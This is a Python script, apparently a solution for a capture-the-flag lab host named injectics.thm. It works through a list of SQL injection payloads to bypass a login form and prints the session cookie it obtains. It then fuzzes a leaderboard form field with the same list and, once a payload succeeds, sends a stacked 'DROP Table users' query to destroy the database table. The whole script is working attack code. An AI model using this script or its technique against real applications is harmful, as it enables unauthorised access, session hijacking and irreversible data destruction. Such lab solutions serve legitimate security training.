import requests
import string

# Set URL and main variables
url_brute = 'http://injectics.thm/functions.php'
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}
file_path = '/home/kali/Downloads/SQLi.txt'

# Start a new session
session = requests.Session()

#Try to read the file content then execute the attack
try:
    with open(file_path, 'r') as file:
        for item in file:

# Create Payload based on the payload selected line by line
            payload={
                "username" : item.strip(),
                "password" : "admin",
                "function" : "login"
            }

# Send the request
            response = session.post(url_brute, headers=headers, data=payload)

# Check for the correct response and print the output in the terminal
            if response.json()['status'] != 'error':
                print(f"Access Granted with this payload: {item.strip()}")
                print(f"Use this session Cookie: {session.cookies['PHPSESSID']}")
                break
except FileNotFoundError:
    print(f"File not found: {file_path}")


# After Obtaining a valid session we can attack the inner page
# Define new variables
inner_url = 'http://injectics.thm/edit_leaderboard.php'
logout_url = 'http://injectics.thm/logout.php'

#Try to read the file content then execute the attack
try:
    with open(file_path, 'r') as file:
        for item in file:

# Create Payload based on the payload selected line by line
            payload={
                "rank": "1",
                "country": "USA",
                "gold": item.strip(),
                "silver": "21",
                "bronze": "12345"
            }

# It seems that all the headers value need to be filled for the request to be successful
            headers = {
                    'Host': 'injectics.thm',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': '46',
                    'Origin': 'http://injectics.thm',
                    'DNT': '1',
                    'Sec-GPC': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Priority': 'u=0, i'
                }
# Send the request
            response = session.post(inner_url, headers=headers, data=payload)

# Check for the correct response and print the output in the terminal
            if 'Error updating data' not in response.text and 'Welcome to the Injectics 2024' not in response.text:
                print(f"Payload found: {item.strip()}")

# Then try to drop the Database if the first attack is successful
                print(f"Try to drop database...")

# Craft the correct payload
                payload='rank=1&country=&gold=23;DROP+Table+users;&silver=21&bronze=12345'

# Send the payload and check if the database is correctly dropped
                response = session.post(inner_url, headers=headers, data=payload)
                if 'important table' in response.text:
                    print(f"Good Job! Database Dropped")
                break
except FileNotFoundError:
    print(f"File not found: {file_path}")
